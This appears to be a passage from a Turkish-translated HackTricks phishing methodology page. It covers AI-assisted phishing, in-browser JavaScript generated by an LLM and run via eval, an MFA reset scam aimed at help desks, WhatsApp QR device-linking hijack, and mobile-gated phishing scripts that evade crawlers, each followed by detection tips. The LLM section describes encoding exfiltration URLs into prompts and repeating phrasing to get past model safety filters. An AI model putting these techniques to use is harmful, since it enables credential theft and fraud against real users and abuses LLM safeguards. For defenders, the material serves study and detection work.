|Generative AI|Public M&A'ya ve sosyal medyadaki iç şakalara atıfta bulunan *one-off* email'ler üretme; callback scam sırasında deep-fake CEO voice kullanma.|
|Agentic AI|Domain'leri otonom olarak kaydetme, open-source intel scrape etme, kurban bir link'e tıklayıp credential'larını göndermediğinde sonraki aşama maillerini hazırlama.|

**Defence:**
• Güvenilmeyen automation kaynaklarından gönderilen mesajları öne çıkaran **dynamic banner'lar** ekleyin (ARC/DKIM anomalileri aracılığıyla).
• Yüksek riskli telefon talepleri için **voice-biometric challenge phrase'leri** kullanıma alın.
• Awareness programme'larında AI-generated lure'ları sürekli simüle edin – static template'ler artık geçerliliğini yitirdi.

Credential phishing için ayrıca agentic browsing abuse konusuna bakın:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Secrets inventory ve detection için AI agent'ların local CLI tools ve MCP abuse yöntemlerine de bakın:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Saldırganlar zararsız görünen HTML gönderebilir ve **trusted bir LLM API'sinden** JavaScript isteyerek stealer'ı runtime sırasında **generate edebilir**, ardından bunu browser içinde çalıştırabilir (ör. `eval` veya dynamic `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** Exfil URL'lerini/Base64 string'lerini prompt'a encode edin; safety filter'larını aşmak ve hallucination'ları azaltmak için ifadeleri yineleyin.
2. **Client-side API call:** Yükleme sırasında JS, public bir LLM'yi (Gemini/DeepSeek/etc.) veya bir CDN proxy'sini çağırır; static HTML'de yalnızca prompt/API call bulunur.
3. **Assemble & exec:** Yanıtı birleştirip çalıştırır (ziyaret başına polymorphic):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** oluşturulan kod lure'u kişiselleştirir (ör. LogoKit token parsing) ve creds'leri prompt-hidden endpoint'e gönderir.

**Evasion traits**
- Trafik, iyi bilinen LLM domain'lerine veya güvenilir CDN proxy'lerine ulaşır; bazen bir backend'e WebSockets üzerinden bağlanır.
- Statik payload yoktur; malicious JS yalnızca render sonrasında mevcut olur.
- Non-deterministic generation'lar her session için **unique stealer'lar** üretir.

**Detection ideas**
- JS etkin sandbox'lar çalıştırın; **LLM response'larından kaynaklanan runtime `eval`/dynamic script creation** işlemlerini işaretleyin.
- LLM API'lerine yapılan front-end POST işlemlerinin hemen ardından dönen metin üzerinde `eval`/`Function` kullanımını arayın.
- Client trafiğinde yetkisiz LLM domain'leri ve ardından yapılan credential POST işlemleri için alert oluşturun.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Klasik push-bombing'in yanı sıra operatörler, help-desk görüşmesi sırasında **yeni bir MFA registration'ı zorla başlatır** ve kullanıcının mevcut token'ını geçersiz kılar. Bundan sonra görünen tüm login prompt'ları kurbana meşru görünür.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta olaylarını izleyin; **`deleteMFA` + `addMFA`** işlemlerinin **aynı IP'den dakikalar içinde** gerçekleşip gerçekleşmediğini kontrol edin.



## Clipboard Hijacking / Pastejacking

Saldırganlar, ele geçirilmiş veya typosquatting uygulanmış bir web sayfasından kurbanın clipboard'ına kötü amaçlı komutları sessizce kopyalayabilir ve ardından kullanıcıyı bunları **Win + R**, **Win + X** veya bir terminal penceresine yapıştırması için kandırabilir. Böylece herhangi bir indirme veya ek olmadan keyfi kod çalıştırılabilir.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Bir lure sayfası (ör. sahte bir bakanlık/CERT “kanalı”), bir WhatsApp Web/Desktop QR kodu görüntüler ve kurbana bunu taramasını söyler; böylece saldırganı sessizce **linked device** olarak ekler.<sup>[[12]](#references)</sup>
* Saldırgan, oturum kaldırılana kadar sohbet ve kişi görünürlüğü elde eder. Kurbanlar daha sonra “new device linked” bildirimi görebilir; savunma ekipleri, güvenilmeyen QR sayfalarının ziyaret edilmesinden kısa süre sonra gerçekleşen beklenmeyen device-link olaylarını araştırabilir.

### Mobile-gated phishing to evade crawlers/sandboxes
Operatörler, desktop crawlers'ın son sayfalara ulaşmasını engellemek için phishing akışlarını giderek daha fazla basit bir device check arkasında çalıştırıyor. Yaygın bir model, touch özelliğine sahip bir DOM'u test eden ve sonucu bir server endpoint'ine gönderen küçük bir script'tir; non-mobile istemciler HTTP 500 (veya boş bir sayfa) alırken mobile kullanıcılarına akışın tamamı sunulur.<sup>[[7]](#references)</sup>

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` mantığı (basitleştirilmiş):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server davranışında sıklıkla gözlemlenenler:
- İlk yükleme sırasında bir session cookie ayarlar.
- `POST /detect {"is_mobile":true|false}` isteğini kabul eder.
- Sonraki GET isteklerine `is_mobile=false` olduğunda 500 (veya placeholder) döndürür; phishing içeriğini yalnızca `true` olduğunda sunar.

Hunting ve detection heuristics:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetrisi: `GET /static/detect_device.js` → `POST /detect` → mobil olmayan istemci için HTTP 500 dizisi; gerçek mobil victim path'leri, devamındaki HTML/JS ile birlikte 200 döndürür.
- İçeriği yalnızca `ontouchstart` veya benzer device check'lerine göre sunan sayfaları engelleyin veya incelemeye alın.

Defence tips:
- Gated content'i ortaya çıkarmak için crawler'ları mobil benzeri fingerprint'ler ve etkin JS ile çalıştırın.
- Yeni kaydedilmiş domain'lerde `POST /detect` sonrasında oluşan şüpheli 500 yanıtları için alert oluşturun.

## References

- [1] [Phishing'de Kullanılan Domain Varyasyonlarını Oluşturma (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing'i Bulma: Araçlar ve Teknikler (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [noVNC Kullanarak Kimlik Bilgilerini Çalma ve 2FA'yı Bypass Etme (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [EvilnoVNC ile Session'ları Çalma ve 2FA'yı Bypass Etme (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Debian Wheezy'de Postfix ile DKIM Kurulumu ve Yapılandırması (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – Mobil ile Gated Phishing Altyapısı ve Heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Runtime Assembly Attacks için Sonraki Sınır: Gerçek Zamanlı Phishing JavaScript'i Oluşturmak İçin LLM'lerden Yararlanma](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking ve TDS: Bir Malware Dağıtım Ekosisteminin İçinden](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Windows.com'da Bitsquatting (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Bitflipping ile Microsoft'un windows.com Trafiğini Hijack Etme (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Aşk mı? Aslında: Pakistan'daki Hedefli Spyware Campaign'inde Yem Olarak Kullanılan Fake Dating App](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoC'leri ve Sample'ları](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
